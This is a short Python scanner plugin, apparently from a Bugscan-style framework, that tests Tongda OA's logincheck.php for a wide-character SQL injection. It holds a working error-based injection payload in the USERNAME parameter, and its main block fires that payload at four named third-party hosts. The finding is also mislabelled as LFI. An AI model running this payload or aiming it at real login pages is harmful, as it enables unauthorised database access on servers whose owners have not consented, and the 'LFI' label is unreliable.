#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: tongdaoa(通达oa)logincheck.php宽字符注入
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2014-078915


def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    data = 'USERNAME=admin%bf%27+or+1+group+by+concat_ws(0x7e,md5(1),floor(rand(0)*2))+having+min(0)+or+1#&PASSWORD=admin&UI=0'
    url = arg + 'logincheck.php'
    code, head, res, errcode, _ = curl.curl2(url, post=data)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(arg + ': logincheck.php LFI')
    else:
        return False
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://oa.henlee.cn/')[1])
    audit(assign('tongdaoa', 'http://kingsoa.kingsenglish.com.cn:81/')[1])
    audit(assign('tongdaoa', 'http://liyuan99.oicp.net:8081/')[1])
    audit(assign('tongdaoa', 'http://oa.wanfang.edu.cn/')[1])   #WAF